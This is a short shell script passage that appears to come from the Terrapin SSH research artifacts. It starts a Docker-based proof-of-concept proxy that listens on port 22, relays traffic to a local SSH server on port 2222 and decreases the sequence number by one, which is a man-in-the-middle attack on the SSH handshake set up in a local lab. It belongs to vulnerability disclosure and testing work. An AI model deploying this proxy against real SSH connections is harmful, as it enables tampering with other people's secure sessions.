...
echo "[+] Starting RcvDecrease proxy on port 22. Connection will be proxied to 127.0.0.1:2222"
# Start RcvDecrease PoC proxy (sequence number will be decreased by N = 1)
docker run \
  --rm \
  --network host \
  --name terrapin-artifacts-poc \
  terrapin-artifacts/sqn-rcv-decrease --server-ip 127.0.0.1 --server-port 2222 -N 1 &
